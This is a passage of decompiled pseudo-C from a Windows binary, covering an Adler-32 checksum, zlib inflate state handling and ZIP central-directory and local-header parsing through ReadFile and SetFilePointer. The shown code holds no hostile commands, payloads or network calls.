          iVar7 = iVar6 + (uint)param_2[4];
          iVar8 = iVar7 + (uint)param_2[5];
          iVar9 = iVar8 + (uint)param_2[6];
          iVar10 = iVar9 + (uint)param_2[7];
          iVar11 = iVar10 + (uint)param_2[8];
          iVar12 = iVar11 + (uint)param_2[9];
          iVar13 = iVar12 + (uint)param_2[10];
          iVar14 = iVar13 + (uint)param_2[0xb];
          iVar15 = iVar14 + (uint)param_2[0xc];
          iVar16 = iVar15 + (uint)param_2[0xd];
          iVar17 = iVar16 + (uint)param_2[0xe];
          uVar2 = iVar17 + (uint)param_2[0xf];
          uVar19 = uVar19 + iVar3 + iVar4 + iVar5 + iVar6 + iVar7 + iVar8 + iVar9 + iVar10 + iVar11
                   + iVar12 + iVar13 + iVar14 + iVar15 + iVar16 + iVar17 + uVar2;
          param_2 = param_2 + 0x10;
          uVar18 = uVar18 - 1;
        } while (uVar18 != 0);
      }
      for (; uVar1 != 0; uVar1 = uVar1 - 1) {
        uVar2 = uVar2 + *param_2;
        param_2 = param_2 + 1;
        uVar19 = uVar19 + uVar2;
      }
      uVar2 = uVar2 % 0xfff1;
      uVar19 = uVar19 % 0xfff1;
    } while (param_3 != 0);
  }
  return uVar19 << 0x10 | uVar2;
}



void __cdecl FUN_00406f50(undefined4 param_1,size_t param_2,size_t param_3)

{
  _calloc(param_2,param_3);
  return;
}



undefined4 FUN_00406f80(void)

{
  uint *puVar1;
  int *piVar2;
  int iVar3;
  int unaff_EDI;
  
  if ((unaff_EDI != 0) && (puVar1 = *(uint **)(unaff_EDI + 0x1c), puVar1 != (uint *)0x0)) {
    *(undefined4 *)(unaff_EDI + 0x14) = 0;
    *(undefined4 *)(unaff_EDI + 8) = 0;
    *(undefined4 *)(unaff_EDI + 0x18) = 0;
    *puVar1 = -(uint)(puVar1[3] != 0) & 7;
    piVar2 = *(int **)(*(int *)(unaff_EDI + 0x1c) + 0x14);
    if ((*piVar2 == 4) || (*piVar2 == 5)) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[3]);
    }
    if (*piVar2 == 6) {
      (**(code **)(unaff_EDI + 0x24))(*(undefined4 *)(unaff_EDI + 0x28),piVar2[1]);
    }
    piVar2[0xd] = piVar2[10];
    piVar2[0xc] = piVar2[10];
    *piVar2 = 0;
    piVar2[7] = 0;
    piVar2[8] = 0;
    if ((code *)piVar2[0xe] != (code *)0x0) {
      iVar3 = (*(code *)piVar2[0xe])(0,0,0);
      piVar2[0xf] = iVar3;
      *(int *)(unaff_EDI + 0x30) = iVar3;
    }
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00407010(void)

{
  int in_EAX;
  
  if (((in_EAX != 0) && (*(int *)(in_EAX + 0x1c) != 0)) && (*(int *)(in_EAX + 0x24) != 0)) {
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_004061b0();
    }
    (**(code **)(in_EAX + 0x24))(*(undefined4 *)(in_EAX + 0x28),*(undefined4 *)(in_EAX + 0x1c));
    *(undefined4 *)(in_EAX + 0x1c) = 0;
    return 0;
  }
  return 0xfffffffe;
}



undefined4 FUN_00407060(void)

{
  int in_EAX;
  int iVar1;
  undefined4 *puVar2;
  
  if (in_EAX == 0) {
    return 0xfffffffe;
  }
  *(undefined4 *)(in_EAX + 0x18) = 0;
  if (*(int *)(in_EAX + 0x20) == 0) {
    *(code **)(in_EAX + 0x20) = FUN_00406f50;
    *(undefined4 *)(in_EAX + 0x28) = 0;
  }
  if (*(int *)(in_EAX + 0x24) == 0) {
    *(undefined **)(in_EAX + 0x24) = &LAB_00406f70;
  }
  iVar1 = (**(code **)(in_EAX + 0x20))(*(undefined4 *)(in_EAX + 0x28),1,0x18);
  *(int *)(in_EAX + 0x1c) = iVar1;
  if (iVar1 != 0) {
    *(undefined4 *)(iVar1 + 0x14) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 0;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0xc) = 1;
    *(undefined4 *)(*(int *)(in_EAX + 0x1c) + 0x10) = 0xf;
    puVar2 = FUN_004056e0(~-(uint)(*(int *)(*(int *)(in_EAX + 0x1c) + 0xc) != 0) & 0x406e10);
    *(undefined4 **)(*(int *)(in_EAX + 0x1c) + 0x14) = puVar2;
    if (*(int *)(*(int *)(in_EAX + 0x1c) + 0x14) != 0) {
      FUN_00406f80();
      return 0;
    }
    FUN_00407010();
  }
  return 0xfffffffc;
}



int FUN_00407110(void)

{
  byte bVar1;
  uint uVar2;
  undefined4 uVar3;
  undefined4 *puVar4;
  byte **in_EAX;
  int iVar5;
  
  if (((in_EAX != (byte **)0x0) && ((uint *)in_EAX[7] != (uint *)0x0)) && (*in_EAX != (byte *)0x0))
  {
    iVar5 = -5;
    uVar2 = *(uint *)in_EAX[7];
    while (uVar2 < 0xe) {
      switch(uVar2) {
      case 0:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 4) = (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        uVar3 = puVar4[1];
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if (((byte)uVar3 & 0xf) == 8) {
          if (((uint)puVar4[1] >> 4) + 8 <= (uint)puVar4[4]) {
            *puVar4 = 1;
            goto switchD_00407146_caseD_1;
          }
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)s_invalid_window_size_0041fb08;
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)s_unknown_compression_method_0041f6d4;
        }
        goto LAB_00407340;
      case 1:
switchD_00407146_caseD_1:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        puVar4 = (undefined4 *)in_EAX[7];
        in_EAX[1] = in_EAX[1] + -1;
        bVar1 = **in_EAX;
        *in_EAX = *in_EAX + 1;
        iVar5 = 0;
        if ((puVar4[1] * 0x100 + (uint)bVar1) % 0x1f == 0) {
          if ((bVar1 & 0x20) != 0) {
            *(undefined4 *)in_EAX[7] = 2;
            goto switchD_00407146_caseD_2;
          }
          *puVar4 = 7;
        }
        else {
          *puVar4 = 0xd;
          in_EAX[6] = (byte *)s_incorrect_header_check_0041fb1c;
          *(undefined4 *)(in_EAX[7] + 4) = 5;
        }
        break;
      case 2:
switchD_00407146_caseD_2:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 3;
      case 3:
        if (in_EAX[1] != (byte *)0x0) {
          in_EAX[2] = in_EAX[2] + 1;
          in_EAX[1] = in_EAX[1] + -1;
          *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
          iVar5 = 0;
          *in_EAX = *in_EAX + 1;
          *(undefined4 *)in_EAX[7] = 4;
switchD_00407146_caseD_4:
          if (in_EAX[1] != (byte *)0x0) {
            in_EAX[2] = in_EAX[2] + 1;
            in_EAX[1] = in_EAX[1] + -1;
            *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
            iVar5 = 0;
            *in_EAX = *in_EAX + 1;
            *(undefined4 *)in_EAX[7] = 5;
switchD_00407146_caseD_5:
            if (in_EAX[1] != (byte *)0x0) {
              in_EAX[2] = in_EAX[2] + 1;
              in_EAX[1] = in_EAX[1] + -1;
              *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
              *in_EAX = *in_EAX + 1;
              in_EAX[0xc] = *(byte **)((int)in_EAX[7] + 8);
              *(undefined4 *)in_EAX[7] = 6;
              return 2;
            }
          }
        }
        return iVar5;
      case 4:
        goto switchD_00407146_caseD_4;
      case 5:
        goto switchD_00407146_caseD_5;
      case 6:
        *(undefined4 *)in_EAX[7] = 0xd;
        in_EAX[6] = (byte *)s_need_dictionary_0041fb34;
        *(undefined4 *)(in_EAX[7] + 4) = 0;
        return -2;
      case 7:
        iVar5 = FUN_00405780(*(void **)(in_EAX[7] + 0x14),iVar5);
        if (iVar5 == -3) {
          *(undefined4 *)in_EAX[7] = 0xd;
          *(undefined4 *)(in_EAX[7] + 4) = 0;
          iVar5 = -3;
        }
        else {
          if (iVar5 == 0) {
            return 0;
          }
          if (iVar5 != 1) {
            return iVar5;
          }
          iVar5 = 0;
          FUN_00405670();
          puVar4 = (undefined4 *)in_EAX[7];
          if (puVar4[3] == 0) {
            *puVar4 = 8;
            goto switchD_00407146_caseD_8;
          }
          *puVar4 = 0xc;
        }
        break;
      case 8:
switchD_00407146_caseD_8:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = (uint)**in_EAX << 0x18;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 9;
      case 9:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x10000;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 10;
switchD_00407146_caseD_a:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX * 0x100;
        iVar5 = 0;
        *in_EAX = *in_EAX + 1;
        *(undefined4 *)in_EAX[7] = 0xb;
switchD_00407146_caseD_b:
        if (in_EAX[1] == (byte *)0x0) {
          return iVar5;
        }
        in_EAX[2] = in_EAX[2] + 1;
        in_EAX[1] = in_EAX[1] + -1;
        *(uint *)(in_EAX[7] + 8) = *(int *)(in_EAX[7] + 8) + (uint)**in_EAX;
        puVar4 = (undefined4 *)in_EAX[7];
        *in_EAX = *in_EAX + 1;
        if (puVar4[1] == puVar4[2]) {
          *(undefined4 *)in_EAX[7] = 0xc;
switchD_00407146_caseD_c:
          return 1;
        }
        *puVar4 = 0xd;
        in_EAX[6] = (byte *)s_incorrect_data_check_0041fb44;
LAB_00407340:
        iVar5 = 0;
        *(undefined4 *)(in_EAX[7] + 4) = 5;
        break;
      case 10:
        goto switchD_00407146_caseD_a;
      case 0xb:
        goto switchD_00407146_caseD_b;
      case 0xc:
        goto switchD_00407146_caseD_c;
      case 0xd:
        return -3;
      }
      uVar2 = *(uint *)in_EAX[7];
    }
  }
  return -2;
}



uint __fastcall FUN_004074b0(undefined4 param_1,void *param_2,uint param_3)

{
  int iVar1;
  BOOL BVar2;
  uint unaff_EBX;
  uint _Size;
  char *unaff_EDI;
  
  _Size = unaff_EBX * param_3;
  if (*unaff_EDI != '\0') {
    BVar2 = ReadFile(*(HANDLE *)(unaff_EDI + 4),param_2,_Size,&param_3,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_EDI[8] = '\x01';
    }
    return param_3 / unaff_EBX;
  }
  iVar1 = *(int *)(unaff_EDI + 0x1c);
  if (*(uint *)(unaff_EDI + 0x18) < iVar1 + _Size) {
    _Size = *(uint *)(unaff_EDI + 0x18) - iVar1;
  }
  _memcpy(param_2,(void *)(*(int *)(unaff_EDI + 0x14) + iVar1),_Size);
  *(uint *)(unaff_EDI + 0x1c) = *(int *)(unaff_EDI + 0x1c) + _Size;
  return _Size / unaff_EBX;
}



undefined4 __cdecl FUN_00407510(uint *param_1)

{
  int iVar1;
  BOOL BVar2;
  char *unaff_ESI;
  size_t _Size;
  byte local_5;
  size_t local_4;
  
  _Size = 1;
  if (*unaff_ESI == '\0') {
    iVar1 = *(int *)(unaff_ESI + 0x1c);
    if (*(uint *)(unaff_ESI + 0x18) < iVar1 + 1U) {
      _Size = *(uint *)(unaff_ESI + 0x18) - iVar1;
    }
    _memcpy(&local_5,(void *)(*(int *)(unaff_ESI + 0x14) + iVar1),_Size);
    *(size_t *)(unaff_ESI + 0x1c) = iVar1 + _Size;
    local_4 = _Size;
  }
  else {
    BVar2 = ReadFile(*(HANDLE *)(unaff_ESI + 4),&local_5,1,&local_4,(LPOVERLAPPED)0x0);
    if (BVar2 == 0) {
      unaff_ESI[8] = '\x01';
    }
  }
  if (local_4 == 1) {
    *param_1 = (uint)local_5;
  }
  else if ((*unaff_ESI != '\0') && (unaff_ESI[8] != '\0')) {
    return 0xffffffff;
  }
  return 0;
}



void FUN_004075a0(void)

{
  uint uVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int *unaff_EBX;
  uint local_4;
  
  iVar2 = FUN_00407510(&local_4);
  uVar1 = local_4;
  if (iVar2 == 0) {
    iVar2 = FUN_00407510(&local_4);
  }
  iVar4 = local_4 * 0x100;
  if (iVar2 == 0) {
    iVar2 = FUN_00407510(&local_4);
  }
  iVar3 = local_4 * 0x10000;
  if (iVar2 == 0) {
    iVar2 = FUN_00407510(&local_4);
    if (iVar2 == 0) {
      *unaff_EBX = local_4 * 0x1000000 + uVar1 + iVar4 + iVar3;
      return;
    }
  }
  *unaff_EBX = 0;
  return;
}



int FUN_00407620(void)

{
  int iVar1;
  DWORD DVar2;
  void *_Dst;
  uint uVar3;
  BOOL BVar4;
  int iVar5;
  size_t _Size;
  char *unaff_ESI;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  uint uStack_8;
  int iStack_4;
  
  if (*unaff_ESI == '\0') {
    *(undefined4 *)(unaff_ESI + 0x1c) = *(undefined4 *)(unaff_ESI + 0x18);
  }
  else {
    if (unaff_ESI[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(unaff_ESI + 4),0,(PLONG)0x0,2);
  }
  if (*unaff_ESI == '\0') {
    uStack_18 = *(uint *)(unaff_ESI + 0x1c);
  }
  else if (unaff_ESI[1] == '\0') {
    uStack_18 = 0;
  }
  else {
    DVar2 = SetFilePointer(*(HANDLE *)(unaff_ESI + 4),0,(PLONG)0x0,1);
    uStack_18 = DVar2 - *(int *)(unaff_ESI + 0xc);
  }
  uStack_14 = 0xffff;
  if (uStack_18 < 0xffff) {
    uStack_14 = uStack_18;
  }
  _Dst = _malloc(0x404);
  if (_Dst == (void *)0x0) {
    return -1;
  }
  uStack_10 = 4;
  iStack_c = -1;
  if (uStack_14 < 5) {
LAB_004077d1:
    _free(_Dst);
    return iStack_c;
  }
  do {
    uVar3 = uStack_10 + 0x400;
    uStack_10 = uStack_14;
    if (uVar3 <= uStack_14) {
      uStack_10 = uVar3;
    }
    iStack_4 = uStack_18 - uStack_10;
    uVar3 = uStack_18 - iStack_4;
    if (0x404 < uVar3) {
      uVar3 = 0x404;
    }
    if (*unaff_ESI == '\0') {
      *(int *)(unaff_ESI + 0x1c) = iStack_4;
    }
    else {
      if (unaff_ESI[1] == '\0') goto LAB_004077d1;
      SetFilePointer(*(HANDLE *)(unaff_ESI + 4),*(int *)(unaff_ESI + 0xc) + iStack_4,(PLONG)0x0,0);
    }
    if (*unaff_ESI == '\0') {
      iVar5 = *(int *)(unaff_ESI + 0x1c);
      _Size = uVar3;
      if (*(uint *)(unaff_ESI + 0x18) < iVar5 + uVar3) {
        _Size = *(uint *)(unaff_ESI + 0x18) - iVar5;
      }
      _memcpy(_Dst,(void *)(*(int *)(unaff_ESI + 0x14) + iVar5),_Size);
      *(size_t *)(unaff_ESI + 0x1c) = *(int *)(unaff_ESI + 0x1c) + _Size;
    }
    else {
      BVar4 = ReadFile(*(HANDLE *)(unaff_ESI + 4),_Dst,uVar3,&uStack_8,(LPOVERLAPPED)0x0);
      _Size = uStack_8;
      if (BVar4 == 0) {
        unaff_ESI[8] = '\x01';
      }
    }
    if (_Size / uVar3 != 1) goto LAB_004077d1;
    iVar5 = uVar3 - 3;
    do {
      iVar1 = iVar5;
      if (iVar1 < 0) goto LAB_004077bc;
      iVar5 = iVar1 + -1;
    } while ((((*(char *)(iVar5 + (int)_Dst) != 'P') || (*(char *)(iVar1 + (int)_Dst) != 'K')) ||
             (*(char *)(iVar1 + 1 + (int)_Dst) != '\x05')) ||
            (*(char *)(iVar1 + 2 + (int)_Dst) != '\x06'));
    iStack_c = iVar5 + iStack_4;
LAB_004077bc:
    if ((iStack_c != 0) || (uStack_14 <= uStack_10)) goto LAB_004077d1;
  } while( true );
}



int * FUN_004077f0(void)

{
  uint uVar1;
  char *in_EAX;
  int iVar2;
  int iVar3;
  int *piVar4;
  int iVar5;
  int iVar6;
  int *piVar7;
  int *piVar8;
  uint uStack_94;
  int local_90;
  int local_8c;
  int local_88;
  int aiStack_84 [7];
  int iStack_68;
  int iStack_64;
  int iStack_60;
  undefined4 uStack_8;
  
  if (in_EAX == (char *)0x0) {
    return (int *)0x0;
  }
  local_90 = 0;
  local_88 = FUN_00407620();
  if (local_88 == -1) {
    local_90 = -1;
  }
  if (*in_EAX == '\0') {
    *(int *)(in_EAX + 0x1c) = local_88;
  }
  else if (in_EAX[1] == '\0') {
    local_90 = -1;
  }
  else {
    SetFilePointer(*(HANDLE *)(in_EAX + 4),*(int *)(in_EAX + 0xc) + local_88,(PLONG)0x0,0);
  }
  iVar2 = FUN_004075a0();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00407510(&uStack_94);
  uVar1 = uStack_94;
  iVar6 = 0;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&uStack_94), iVar2 == 0)) {
    local_8c = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_8c = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = FUN_00407510(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&uStack_94), iVar2 == 0)) {
    iVar6 = uStack_94 * 0x100 + uVar1;
  }
  else {
    local_90 = -1;
  }
  iVar2 = FUN_00407510(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&uStack_94), iVar2 == 0)) {
    aiStack_84[1] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[1] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  iVar2 = aiStack_84[1];
  iVar3 = FUN_00407510(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar3 == 0) && (iVar3 = FUN_00407510(&uStack_94), iVar3 == 0)) {
    iVar5 = uStack_94 * 0x100 + uVar1;
  }
  else {
    iVar5 = 0;
    if (iVar3 != 0) {
      local_90 = -1;
    }
  }
  if (((iVar5 != iVar2) || (iVar6 != 0)) || (local_8c != 0)) {
    local_90 = -0x67;
  }
  iVar2 = FUN_004075a0();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_004075a0();
  if (iVar2 != 0) {
    local_90 = -1;
  }
  iVar2 = FUN_00407510(&uStack_94);
  uVar1 = uStack_94;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&uStack_94), iVar2 == 0)) {
    aiStack_84[2] = uStack_94 * 0x100 + uVar1;
  }
  else {
    aiStack_84[2] = 0;
    if (iVar2 != 0) {
      local_90 = -1;
    }
  }
  if (((uint)(iStack_64 + iStack_60) <= (uint)(*(int *)(in_EAX + 0xc) + local_88)) &&
     (local_90 == 0)) {
    aiStack_84[3] = ((*(int *)(in_EAX + 0xc) - iStack_64) - iStack_60) + local_88;
    iStack_68 = local_88;
    uStack_8 = 0;
    *(undefined4 *)(in_EAX + 0xc) = 0;
    piVar4 = (int *)_malloc(0x80);
    piVar7 = aiStack_84;
    piVar8 = piVar4;
    for (iVar2 = 0x20; iVar2 != 0; iVar2 = iVar2 + -1) {
      *piVar8 = *piVar7;
      piVar7 = piVar7 + 1;
      piVar8 = piVar8 + 1;
    }
    FUN_00407ed0();
    return piVar4;
  }
  if (in_EAX[0x10] != '\0') {
    CloseHandle(*(HANDLE *)(in_EAX + 4));
  }
  FUN_00409875(in_EAX);
  return (int *)0x0;
}



int __cdecl FUN_00407a80(int *param_1,uint *param_2,void *param_3,uint param_4)

{
  char *pcVar1;
  char **in_EAX;
  int iVar2;
  uint uVar3;
  int *piVar4;
  int local_5c;
  uint local_58;
  int aiStack_54 [4];
  uint uStack_44;
  uint uStack_34;
  int iStack_30;
  int iStack_2c;
  int iStack_28;
  int iStack_24;
  int iStack_1c;
  uint uStack_18;
  uint uStack_14;
  uint uStack_10;
  int iStack_c;
  int iStack_8;
  
  local_5c = 0;
  if (in_EAX == (char **)0x0) {
    return -0x66;
  }
  pcVar1 = *in_EAX;
  if (*pcVar1 == '\0') {
    *(char **)(pcVar1 + 0x1c) = in_EAX[5] + (int)in_EAX[3];
  }
  else {
    if (pcVar1[1] == '\0') {
      local_5c = -1;
      goto LAB_00407aff;
    }
    SetFilePointer(*(HANDLE *)(pcVar1 + 4),
                   (LONG)(in_EAX[5] + (int)in_EAX[3] + *(int *)(pcVar1 + 0xc)),(PLONG)0x0,0);
  }
  iVar2 = FUN_004075a0();
  if (iVar2 == 0) {
    if (local_58 != 0x2014b50) {
      local_5c = -0x67;
    }
  }
  else {
    local_5c = -1;
  }
LAB_00407aff:
  iVar2 = FUN_00407510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&local_58), iVar2 == 0)) {
    aiStack_54[0] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[0] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00407510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&local_58), iVar2 == 0)) {
    aiStack_54[1] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[1] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00407510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&local_58), iVar2 == 0)) {
    aiStack_54[2] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[2] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00407510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&local_58), iVar2 == 0)) {
    aiStack_54[3] = local_58 * 0x100 + uVar3;
  }
  else {
    aiStack_54[3] = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004075a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  uStack_10 = uStack_44 >> 0x10 & 0x1f;
  iStack_8 = (uStack_44 >> 0x19) + 0x7bc;
  iStack_c = (uStack_44 >> 0x15 & 0xf) - 1;
  uStack_14 = uStack_44 >> 0xb & 0x1f;
  uStack_18 = uStack_44 >> 5 & 0x3f;
  iStack_1c = (uStack_44 & 0x1f) * 2;
  iVar2 = FUN_004075a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004075a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004075a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_00407510(&local_58);
  uStack_34 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&local_58), iVar2 == 0)) {
    uStack_34 = local_58 * 0x100 + uStack_34;
  }
  else {
    uStack_34 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00407510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&local_58), iVar2 == 0)) {
    iStack_30 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_30 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00407510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&local_58), iVar2 == 0)) {
    iStack_2c = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_2c = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00407510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&local_58), iVar2 == 0)) {
    iStack_28 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_28 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_00407510(&local_58);
  uVar3 = local_58;
  if ((iVar2 == 0) && (iVar2 = FUN_00407510(&local_58), iVar2 == 0)) {
    iStack_24 = local_58 * 0x100 + uVar3;
  }
  else {
    iStack_24 = 0;
    if (iVar2 != 0) {
      local_5c = -1;
    }
  }
  iVar2 = FUN_004075a0();
  if (iVar2 != 0) {
    local_5c = -1;
  }
  iVar2 = FUN_004075a0();
  if (iVar2 != 0) {
    return -1;
  }
  if (local_5c == 0) {
    if (param_3 != (void *)0x0) {
      if (uStack_34 < param_4) {
        *(undefined *)(uStack_34 + (int)param_3) = 0;
      }
      if (((uStack_34 != 0) && (param_4 != 0)) &&
         (uVar3 = FUN_004074b0(param_4,param_3,1), uVar3 != 1)) {
        return -1;
      }
    }
    if (param_1 != (int *)0x0) {
      piVar4 = aiStack_54;
      for (iVar2 = 0x14; iVar2 != 0; iVar2 = iVar2 + -1) {
        *param_1 = *piVar4;
        piVar4 = piVar4 + 1;
        param_1 = param_1 + 1;
      }
    }
    if (param_2 != (uint *)0x0) {
      *param_2 = local_58;
    }
  }
  return local_5c;
}



int FUN_00407ed0(void)

{
  int iVar1;
  int unaff_ESI;
  
  if (unaff_ESI == 0) {
    return -0x66;
  }
  *(undefined4 *)(unaff_ESI + 0x14) = *(undefined4 *)(unaff_ESI + 0x24);
  *(undefined4 *)(unaff_ESI + 0x10) = 0;
  iVar1 = FUN_00407a80((int *)(unaff_ESI + 0x28),(uint *)(unaff_ESI + 0x78),(void *)0x0,0);
  *(uint *)(unaff_ESI + 0x18) = (uint)(iVar1 == 0);
  return iVar1;
}



int __cdecl FUN_00407f10(char **param_1,char **param_2,char **param_3)

{
  char cVar1;
  char *pcVar2;
  char *pcVar3;
  int iVar4;
  char *pcVar5;
  int iVar6;
  char **unaff_EDI;
  char *pcStack_8;
  char *local_4;
  
  iVar6 = 0;
  *param_1 = (char *)0x0;
  pcVar5 = unaff_EDI[3];
  pcVar2 = unaff_EDI[0x1e];
  *param_2 = (char *)0x0;
  pcVar3 = *unaff_EDI;
  cVar1 = *pcVar3;
  *param_3 = (char *)0x0;
  if (cVar1 == '\0') {
    *(char **)(pcVar3 + 0x1c) = pcVar5 + (int)pcVar2;
  }
  else {
    if (pcVar3[1] == '\0') {
      return -1;
    }
    SetFilePointer(*(HANDLE *)(pcVar3 + 4),(LONG)(pcVar5 + (int)pcVar2 + *(int *)(pcVar3 + 0xc)),
                   (PLONG)0x0,0);
  }
  iVar4 = FUN_004075a0();
  if (iVar4 == 0) {
    if (local_4 != (char *)0x4034b50) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00407510((uint *)&local_4);
  if (iVar4 == 0) {
    iVar4 = FUN_00407510((uint *)&local_4);
    if (iVar4 != 0) goto LAB_00407fa3;
  }
  else {
LAB_00407fa3:
    iVar6 = -1;
  }
  iVar4 = FUN_00407510((uint *)&local_4);
  pcVar5 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00407510((uint *)&local_4);
    if (iVar4 != 0) goto LAB_00407fdd;
    local_4 = pcVar5 + (int)local_4 * 0x100;
  }
  else {
LAB_00407fdd:
    local_4 = (char *)0x0;
    if (iVar4 != 0) {
      iVar6 = -1;
    }
  }
  iVar4 = FUN_00407510((uint *)&pcStack_8);
  pcVar5 = pcStack_8;
  if (iVar4 == 0) {
    iVar4 = FUN_00407510((uint *)&pcStack_8);
    if (iVar4 != 0) goto LAB_00408060;
    pcStack_8 = pcVar5 + (int)pcStack_8 * 0x100;
LAB_00408021:
    if ((iVar6 == 0) &&
       ((pcVar5 = unaff_EDI[0xd], pcStack_8 != pcVar5 ||
        ((pcVar5 != (char *)0x0 && (pcVar5 != (char *)0x8)))))) {
      iVar6 = -0x67;
    }
  }
  else {
LAB_00408060:
    pcStack_8 = (char *)0x0;
    if (iVar4 == 0) goto LAB_00408021;
    iVar6 = -1;
  }
  iVar4 = FUN_004075a0();
  if (iVar4 != 0) {
    iVar6 = -1;
  }
  iVar4 = FUN_004075a0();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0xf])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_004075a0();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x10])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_004075a0();
  if (iVar4 == 0) {
    if (((iVar6 == 0) && (pcStack_8 != unaff_EDI[0x11])) && (((uint)local_4 & 8) == 0)) {
      iVar6 = -0x67;
    }
  }
  else {
    iVar6 = -1;
  }
  iVar4 = FUN_00407510((uint *)&local_4);
  pcStack_8 = local_4;
  if (iVar4 == 0) {
    iVar4 = FUN_00407510((uint *)&local_4);
